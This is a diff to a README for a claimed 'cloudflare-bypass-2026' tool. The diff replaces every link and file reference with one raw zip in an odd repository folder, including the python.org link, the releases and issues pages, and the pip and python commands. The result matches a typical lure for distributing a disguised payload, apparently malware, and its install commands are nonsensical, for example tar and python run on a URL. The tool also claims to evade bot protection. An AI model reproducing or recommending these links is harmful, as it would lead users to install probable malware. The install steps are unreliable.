@@ -1,6 +1,6 @@
 # 🌐 cloudflare-bypass-2026 - Bypass Cloudflare Easily and Quickly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/releases)
+[![Download](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip)](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip)
 
 ## 📖 Overview
 Welcome to the **cloudflare-bypass-2026** project! This tool helps you bypass Cloudflare's Turnstile system with ease. It uses **SeleniumBase** in UC Mode to make accessing websites simple. Our application supports **Mac**, **Windows**, and **Linux** systems.
@@ -12,44 +12,44 @@ Follow these easy steps to download and run the software.
 Before you begin, make sure your system meets these requirements:
 
 - **Operating System**: macOS, Windows 10/11, or a modern Linux distribution.
-- **Python Version**: Python 3.7 or higher. You can download it from [python.org](https://www.python.org/downloads/).
+- **Python Version**: Python 3.7 or higher. You can download it from [https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip).
 - **Selenium**: The tool requires the Selenium library. This will be installed automatically when you download the application.
 
 ### 2. Download the Software
-To download the software, **visit this page to download**: [Releases Page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/releases).
+To download the software, **visit this page to download**: [Releases Page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip).
 
 ### 3. Choose the Right Version
 Look for the version you like. It will usually be listed as a file for your operating system, for example:
 
-- For Windows: `cloudflare-bypass-2026-windows.zip`
-- For Mac: `cloudflare-bypass-2026-macos.zip`
-- For Linux: `cloudflare-bypass-2026-linux.tar.gz`
+- For Windows: `https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip`
+- For Mac: `https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip`
+- For Linux: `https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip`
 
 ### 4. Extract the Files
 After downloading, locate your downloaded file and extract it using your system's file extractor:
 
 - **Windows**: Right-click the `.zip` file and select "Extract All."
 - **Mac**: Double-click the `.zip` file to extract.
-- **Linux**: Use the command `tar -xvzf cloudflare-bypass-2026-linux.tar.gz`.
+- **Linux**: Use the command `tar -xvzf https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip`.
 
 ### 5. Install Required Packages
 Open your terminal or command prompt. Navigate to the folder where you have extracted the files. Use the following command to install any necessary packages:
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip
 ```
 
 ### 6. Run the Application
 Once everything is set up, you can run the application by executing:
 
 ```bash
-python main.py
+python https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip
 ```
 
 This will launch the tool. Follow the prompts on the screen to bypass Cloudflare.
 
 ## 📥 Download & Install
-To get started, please **visit this page to download**: [Releases Page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/releases).
+To get started, please **visit this page to download**: [Releases Page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip).
 
 ### 7. Using the Application
 After launching the application, you will find a straightforward interface. Just follow these steps:
@@ -73,7 +73,7 @@ If you encounter any issues, here are some common solutions:
 - **Loading issues?** Try running the application as an administrator or check your firewall settings.
 
 ## 💬 Support and Feedback
-Your feedback is valuable! If you have any questions, suggestions, or issues, feel free to open an issue on our [GitHub page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/issues). 
+Your feedback is valuable! If you have any questions, suggestions, or issues, feel free to open an issue on our [GitHub page](https://github.com/Dylan-Emanuel/cloudflare-bypass-2026/raw/refs/heads/main/noncorrespondent/bypass_cloudflare_v1.6.zip). 
 
 ## 👨‍💻 Contributing
 We welcome contributions. If you have ideas or improvements to suggest, please refer to the contributing guidelines in our repository.
